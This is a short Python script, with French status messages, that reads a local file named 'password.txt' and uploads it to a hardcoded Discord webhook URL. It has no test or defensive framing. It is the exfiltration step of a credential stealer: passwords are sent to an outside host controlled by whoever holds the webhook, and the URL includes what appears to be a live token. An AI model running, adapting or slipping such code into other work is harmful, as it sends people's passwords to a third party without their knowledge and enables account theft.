import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1115195751010668595/Es6GJ-hbe4psKJDSvDlMFAYPewcl458YLqMOgxntfk9hq7klvlRDKU-dAIowXwpVjb6L"
FILE_PATH = "password.txt"

with open(FILE_PATH, "rb") as file:
    response = requests.post(
        WEBHOOK_URL,
        files={"file": ("a.txt", file, "text/plain")}
    )

if response.ok:
    print("Fichier envoyé avec succès.")
else:
    print(f"Échec de l'envoi : HTTP {response.status_code}")
    print(response.text)